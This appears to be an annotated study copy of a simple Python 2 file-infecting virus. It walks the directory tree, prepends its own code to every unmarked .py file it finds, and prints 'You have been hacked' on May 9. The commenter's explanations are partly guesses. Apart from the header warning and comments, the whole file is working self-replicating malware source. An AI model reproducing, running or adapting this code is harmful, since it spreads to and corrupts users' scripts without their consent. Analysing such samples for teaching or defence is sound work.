#!/usr/bin/python                                                                         # NOT python3

# DO NOT RUN FOR ANALYSIS ONLY

import os
import datetime

SIGNATURE = "VIRUS"                                                                       # Variable
 
def locate(path):                                                                         # Function, stores uninfected files into a variable and ignores files previously flagged by this script
    files_targeted = []                                                                   # Stores targeted files
    filelist = os.listdir(path)                                                           # Stores targetted dir tree
    for fname in filelist:                                                                # Conditional, Walks through targetted dir tree. Perhaps a better method would be os walk
        if os.path.isdir(path+"/"+fname):                                                 # Conditional Parses if a target is a dir or not
            files_targeted.extend(locate(path+"/"+fname))       
        elif fname[-3:] == ".py":                                                         # Parses if a target is a python script
            infected = False                                                              # Marks scripts with an infected flag
            for line in open(path+"/"+fname):                                             # Conditional
                if SIGNATURE in line:                                                     # Conditional, Stops if file has been flagged infected
                    infected = True
                    break
            if infected == False:                                                         # Conditional
                files_targeted.append(path+"/"+fname)                                     # Stores flagged files in the variable at the start of this function
    return files_targeted

def infect(files_targeted):                                                               # Function that takes list of flagged files from 'locate' function
    virus = open(os.path.abspath(__file__))                                               # Opens init.py's
    virusstring = ""                                                                      # Empty var
    for i,line in enumerate(virus):                                                       # Conditional, enumerates aforementioned var 'virus' and adds lines to empty var
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:                                                          # Conditional, Opens each file in targeted files and adds a ton of crap, I believe it duplicates the code in the targeted file. I'd rather not test it                          
        f = open(fname)                                        
        temp = f.read()                                                                   # Stores file contents into a var
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)                                                       # Adds all the extra crap to targeted file
        f.close()

def detonate():                                                                           # Function, If it's May 9th print you have been hacked
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:           # Conditional
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))                                              # Stores normalized path
infect(files_targeted)                                                                    # Passes dir into infect function
detonate()                                                                                # Activates detonate function

# I believe this file modifies all scripts to be totally unusuable and 'detonate' adds a little flair letting everyone know they've been hacked
